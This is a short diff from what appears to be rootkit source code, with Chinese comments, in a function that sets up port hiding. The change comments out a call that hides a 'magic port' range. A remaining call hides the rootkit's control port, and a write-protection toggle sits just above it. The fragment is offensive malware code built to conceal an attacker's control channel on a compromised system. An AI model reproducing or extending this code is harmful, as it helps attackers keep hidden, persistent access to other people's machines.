@@ -491,7 +491,7 @@ int init_port_hiding(void) {
     enable_write_protection();
     
     // 自动隐藏魔术端口范围
-    hide_port_range(htons(MAGIC_PORT_START), htons(MAGIC_PORT_END), 0);
+    // hide_port_range(htons(MAGIC_PORT_START), htons(MAGIC_PORT_END), 0);
     
     // 隐藏rootkit控制端口
     hide_port(htons(CONTROL_PORT), 0);
